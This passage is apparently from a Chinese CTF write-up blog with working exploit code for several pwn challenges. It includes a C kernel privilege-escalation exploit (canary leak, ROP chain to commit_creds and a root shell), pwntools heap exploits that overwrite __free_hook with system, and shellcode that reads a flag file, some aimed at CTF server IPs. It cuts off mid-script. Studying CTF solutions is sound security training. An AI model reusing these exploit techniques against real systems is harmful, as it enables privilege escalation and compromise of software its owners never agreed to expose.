class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_eflags),<span class="string">"=r"</span>(user_sp)</span><br><span class="line">    :</span><br><span class="line">    : <span class="string">"memory"</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void shell(void) &#123;</span><br><span class="line">    setuid(geteuid());</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">unsigned long rop[<span class="number">0x200</span>];</span><br><span class="line">int main()&#123;</span><br><span class="line">    signal(SIGSEGV,shell);</span><br><span class="line">    save_stats();</span><br><span class="line">    printf(<span class="string">"Leave me a address:"</span>);</span><br><span class="line">    scanf(<span class="string">"%lx"</span>,&amp;amp;base);</span><br><span class="line">    prepare_kernel_cred = base + <span class="number">0xa1820</span>;</span><br><span class="line">    commit_creds = base +<span class="number">0xa1436</span>;//<span class="number">0xa1430</span></span><br><span class="line">    p_rdi = base +<span class="number">0x3ee37f</span>;</span><br><span class="line">    p_rdx = base +<span class="number">0x83f22</span>;</span><br><span class="line">    swapgs_rbp = base +<span class="number">0x636b4</span>;</span><br><span class="line">    iretq =base +<span class="number">0x81d217</span>;</span><br><span class="line">    mov_ca = base +<span class="number">0xdef79</span>;</span><br><span class="line">    int fd = open(<span class="string">"/dev/babyhacker"</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        puts(<span class="string">"open fail!"</span>);</span><br><span class="line">        exit(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    unsigned long tt[<span class="number">0x200</span>];</span><br><span class="line">    tt[<span class="number">0</span>] = <span class="number">0x6161616161616161</span>UL;</span><br><span class="line">    <span class="keyword">for</span>(int i = <span class="number">1</span>;i&lt;<span class="number">40</span>;i++)&#123;</span><br><span class="line">        tt[i] = <span class="number">0x6161616161616161</span>UL;</span><br><span class="line">    &#125;</span><br><span class="line">    ioctl(fd,cmd3,<span class="number">-65200</span>);</span><br><span class="line">    ioctl(fd,cmd2,tt);</span><br><span class="line">    unsigned long canary = tt[<span class="number">40</span>];</span><br><span class="line">    printf(<span class="string">"canary is %p"</span>,canary);</span><br><span class="line">    ioctl(fd,cmd3,<span class="number">-65088</span>);</span><br><span class="line">    <span class="keyword">for</span>(int i = <span class="number">1</span>;i&lt;<span class="number">40</span>;i++)&#123;</span><br><span class="line">        tt[i] = <span class="number">0x6161616161616161</span>UL;</span><br><span class="line">    &#125;</span><br><span class="line">    tt[<span class="number">40</span>] = canary;</span><br><span class="line">    tt[<span class="number">41</span>] =<span class="number">0x0</span>UL;</span><br><span class="line">    tt[<span class="number">42</span>] =p_rdi;</span><br><span class="line">    tt[<span class="number">43</span>] = <span class="number">0x0</span>UL;</span><br><span class="line">    tt[<span class="number">44</span>] = prepare_kernel_cred;</span><br><span class="line">    tt[<span class="number">45</span>] = p_rdx;</span><br><span class="line">    tt[<span class="number">46</span>] = commit_creds;</span><br><span class="line">    tt[<span class="number">47</span>] = mov_ca;</span><br><span class="line">    tt[<span class="number">48</span>] = swapgs_rbp;</span><br><span class="line">    tt[<span class="number">49</span>] = <span class="number">0xdeadbeef</span>UL;</span><br><span class="line">    tt[<span class="number">50</span>] = iretq;</span><br><span class="line">    tt[<span class="number">51</span>] = (unsigned long) shell;</span><br><span class="line">    tt[<span class="number">52</span>] += user_cs;</span><br><span class="line">    tt[<span class="number">53</span>] += user_eflags;</span><br><span class="line">    tt[<span class="number">54</span>] += user_sp;</span><br><span class="line">    tt[<span class="number">55</span>] += user_ss;</span><br><span class="line">//cat /proc/kallsyms | grep startup_64commit_creds +<span class="number">0xa1430</span> :startup_64</span><br><span class="line">//prepare_kernel_cred+<span class="number">0xa1820</span></span><br><span class="line">//pop rdi:+<span class="number">0xba20b6</span>  ; </span><br><span class="line">//pop rdx:+<span class="number">0x83f22</span> ;</span><br><span class="line">//+<span class="number">0x636b4</span> : swapgs ; pop rbp ; ret</span><br><span class="line">    ioctl(fd,cmd1,tt);</span><br><span class="line">    printf(<span class="string">"cmd1 done!"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="bjut"><a href="#bjut" class="headerlink" title="bjut"></a>bjut</h2><p>不断尝试会发现又一个负数溢出，然后会leak出一些东西，这些东西里面有个stdin,stdout,stderr的地址，用来搜一下即可。然后再对那个地址覆盖一下即可。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = remote(<span class="string">"121.37.167.199"</span>,<span class="number">9997</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"The length of your hw:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Input your hw:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"The index of your hw:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"The index of your hw:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Input your hw:"</span>)</span><br><span class="line">    p.send(str(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"The index of your hw:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"><span class="comment">#size &lt; 0x80</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line">show(<span class="number">-1879</span>)</span><br><span class="line">p.recvuntil(<span class="string">"&amp;#92;n"</span>)</span><br><span class="line">data = p.recv()</span><br><span class="line">libc_addr =  u64(data[<span class="number">0x91</span>:<span class="number">0x91</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">"&amp;#92;x00"</span>))<span class="number">-0x1e5760</span></span><br><span class="line">edit(<span class="number">-1879</span>,p64( <span class="number">0x052fd0</span>+libc_addr))</span><br><span class="line"><span class="comment">#0x052fd0 2.29 0x1e5760</span></span><br><span class="line"><span class="comment">#0x050300 2.28 0x1e5760</span></span><br><span class="line"><span class="comment">#0x04f440 2.27 0x3ec760</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h2 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h2><p>先申请了0x10的堆块，并且没有对申请出来的堆块进行初始化，可以遗留一些地址造成堆块的uaf然后致使最后产生任意地址写，泄漏就更改stdout即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">p = process(<span class="string">"./easyheap"</span>)</span><br><span class="line">a = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"><span class="comment">#p = remote("121.36.209.145",9997)</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content,flag)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"How long is this message?"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span>(flag):</span><br><span class="line">        p.recvuntil(<span class="string">"What is the content of the message?"</span>)</span><br><span class="line">        p.sendline(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"What is the index of the item to be deleted?"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"What is the index of the item to be modified?"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"What is the content of the message?"</span>)</span><br><span class="line">    p.send(str(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"a"</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">"b"</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">"/bin/sh&amp;#92;x00"</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"a"</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">"b"</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">"/bin/sh&amp;#92;x00"</span>,<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x401</span>,<span class="string">"a"</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"a"</span>,<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x6020d8</span>)+p64(<span class="number">0x1000</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x602080</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x602088</span>)+p64(<span class="number">0x1000</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x100</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x6020b0</span>)+p64(<span class="number">0x1000</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>))</span><br><span class="line">m = p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">"&amp;#92;x00"</span> </span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">"&amp;#92;x00"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"&amp;#92;x00"</span>*<span class="number">0x18</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x3c36e0</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(libc_addr + a.symbols[<span class="string">"__free_hook"</span>])+p64(<span class="number">0x1000</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(libc_addr+a.symbols[<span class="string">"system"</span>]))</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="easy-unicorn4"><a href="#easy-unicorn4" class="headerlink" title="easy_unicorn4"></a>easy_unicorn4</h2><p>首先用下面的代码把dump里面的elf提取出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">"""</span></span><br><span class="line"><span class="string">| .gcc_except_table            |            401e64  |               f5c  |         24 |</span></span><br><span class="line"><span class="string">| debug001                     |      7ffff783b000  |               f88  |       4000 |</span></span><br><span class="line"><span class="string">| .data                        |            603090  |              4fb8  |         10 |</span></span><br><span class="line"><span class="string">| libc_2.23.so                 |      7ffff7475000  |              5008  |     1c0000 |</span></span><br><span class="line"><span class="string">| .fini                        |            4015a4  |            1c5008  |          9 |</span></span><br><span class="line"><span class="string">| .plt                         |            4009f0  |            1c5111  |        100 |</span></span><br><span class="line"><span class="string">| .jcr                         |            602e00  |            1c5211  |          8 |</span></span><br><span class="line"><span class="string">| ld_2.23.so1                  |      7ffff7ffc000  |            1c5219  |       1000 |</span></span><br><span class="line"><span class="string">| ld_2.23.so2                  |      7ffff7ffd000  |            1c6219  |       1000 |</span></span><br><span class="line"><span class="string">| LOAD                         |            400000  |            1c7239  |        9c8 |</span></span><br><span class="line"><span class="string">| .init                        |            4009c8  |            1c7c01  |         1a |</span></span><br><span class="line"><span class="string">| [stack]                      |      7ffffffde000  |            1c7c1b  |      21000 |</span></span><br><span class="line"><span class="string">| libstdc__.so.6.0.21          |      7ffff7a55000  |            1e8c2b  |     172000 |</span></span><br><span class="line"><span class="string">| LOAD2                        |            400af8  |            35ac3b  |          8 |</span></span><br><span class="line"><span class="string">| .fini_array                  |            602df8  |            35ac43  |          8 |</span></span><br><span class="line"><span class="string">| .prgend                      |            6031d8  |            35ac4b  |          1 |</span></span><br><span class="line"><span class="string">| libstdc__.so.6.0.212         |      7ffff7dc7000  |            35ac4c  |       a000 |</span></span><br><span class="line"><span class="string">| libstdc__.so.6.0.213         |      7ffff7dd1000  |            364c4c  |       2000 |</span></span><br><span class="line"><span class="string">| .plt.got                     |            400af0  |            366c4c  |          8 |</span></span><br><span class="line"><span class="string">| libstdc__.so.6.0.211         |      7ffff7bc7000  |            366c54  |       d000 |</span></span><br><span class="line"><span class="string">| ld_2.23.so                   |      7ffff7dd7000  |            373c54  |      26000 |</span></span><br><span class="line"><span class="string">| libgcc_s.so.1                |      7ffff783f000  |            399c54  |      16000 |</span></span><br><span class="line"><span class="string">| libgcc_s.so.11               |      7ffff7a54000  |            3afc54  |       1000 |</span></span><br><span class="line"><span class="string">| libm_2.23.so1                |      7ffff7274000  |            3b0c54  |       2000 |</span></span><br><span class="line"><span class="string">| [vsyscall]                   |  ffffffffff600000  |            4d0299  |       1000 |</span></span><br><span class="line"><span class="string">| [heap]                       |            604000  |            4d1299  |      32000 |</span></span><br><span class="line"><span class="string">| .init_array                  |            602df0  |            503299  |          8 |</span></span><br><span class="line"><span class="string">| .eh_frame                    |            401a88  |            5032a1  |        3dc |</span></span><br><span class="line"><span class="string">| debug003                     |      7ffff7fe7000  |            50367d  |       6000 |</span></span><br><span class="line"><span class="string">| xctf_pwn3                    |            603278  |            50967d  |        d88 |</span></span><br><span class="line"><span class="string">| xctf_pwn1                    |            602000  |            50a405  |        df0 |</span></span><br><span class="line"><span class="string">| xctf_pwn2                    |            6031d9  |            50b1f5  |          7 |</span></span><br><span class="line"><span class="string">| debug002                     |      7ffff7dd3000  |            50b1fc  |       4000 |</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">data = data.split(<span class="string">'&amp;#92;n'</span>)[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">segs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    t = i.split(<span class="string">'|'</span>)[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">    t = [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> t]</span><br><span class="line">    t = [int(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> t[<span class="number">1</span>:]] + t[:<span class="number">1</span>]</span><br><span class="line">    segs.append(t)</span><br><span class="line"></span><br><span class="line">segs.sort()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> segs:</span><br><span class="line">    print(hex(i[<span class="number">0</span>]),i[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'./recover_pwn'</span>,<span class="string">'wb'</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./xctf_pwn.dump'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> fr:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> segs:</span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">0</span>] &gt;= <span class="number">0x604000</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        print(i[<span class="number">2</span>])</span><br><span class="line">        fr.seek(i[<span class="number">1</span>])</span><br><span class="line">        f.write(fr.read(i[<span class="number">2</span>]))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>下面是exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = ['tmux','-x','sh','-c']</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span> ]</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    <span class="comment">#p=process('./')</span></span><br><span class="line">    <span class="comment">#p=process(['./x86_sandbox','-debug'],env=&#123;'LD_PRELOAD':'./libunicorn.so.1'&#125;)</span></span><br><span class="line">    p=process([<span class="string">'./x86_sandbox'</span>],env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libunicorn.so.1'</span>&#125;)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'121.37.167.199'</span>, <span class="number">9998</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'[ Disable system call safe mode ]'</span>)</span><br><span class="line">ru(<span class="string">'Your machine-code is '</span>)</span><br><span class="line">ru(<span class="string">'&amp;#92;x1B[1;31;5m '</span>)</span><br><span class="line">data = ru(<span class="string">' '</span>).strip()</span><br><span class="line">ru(<span class="string">'&lt;&lt;'</span>)</span><br><span class="line">data = [int(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> data.split(<span class="string">'-'</span>)]</span><br><span class="line">w = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    w += p32(i)</span><br><span class="line">data = w</span><br><span class="line">data = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">    data[i] ^= data[i+<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>):</span><br><span class="line">    se(<span class="string">'&amp;#92;n'</span>)</span><br><span class="line">    ru(<span class="string">'try'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    se(<span class="string">'%02X'</span>%i)</span><br><span class="line"></span><br><span class="line">se(<span class="string">'&amp;#92;n'</span>)</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">shellcode = asm(<span class="string">'mov r10, rsi'</span>)</span><br><span class="line">shellcode += asm(shellcraft.open(<span class="string">'flag.txt'</span>))</span><br><span class="line">shellcode += asm(shellcraft.read(<span class="number">3</span>,<span class="string">'r10'</span>,<span class="number">0x80</span>))</span><br><span class="line">shellcode += asm(shellcraft.write(<span class="number">1</span>,<span class="string">'r10'</span>,<span class="number">0x80</span>))</span><br><span class="line">shellcode += asm(shellcraft.amd64.linux.exit(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'data ptr:'</span>)</span><br><span class="line">ptr = int(ru(<span class="string">'&amp;#92;n'</span>),<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">'data&lt;&lt;'</span>)</span><br><span class="line">sl(shellcode)</span><br><span class="line">ru(<span class="string">'&lt;&lt;'</span>)</span><br><span class="line">sl(str(ptr))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    ru(<span class="string">'&lt;&lt;'</span>)</span><br><span class="line">    sl(str(ptr+<span class="number">0x400</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="kernoob"><a href="#kernoob" class="headerlink" title="kernoob"></a>kernoob</h2><p>解题是非预期，解开.cpio包然后搜索flag即可。<br><img src="https://i.loli.net/2020/03/10/MkNyzBPhougt3EL.png" alt="kernoob.png"></p>
<h2 id="lgd"><a href="#lgd" class="headerlink" title="lgd"></a>lgd</h2><p>n132:<br>虽然有很多看不懂的操作但是存在长度判断错误可以造成溢出，setcontext以orw</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(c)</span>:</span></span><br><span class="line">        p.sendlineafter(<span class="string">"&gt;&gt; "</span>,str(c))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">        cmd(<span class="number">1</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"?&amp;#92;n"</span>,str(size))</span><br><span class="line">        p.sendafter(<span 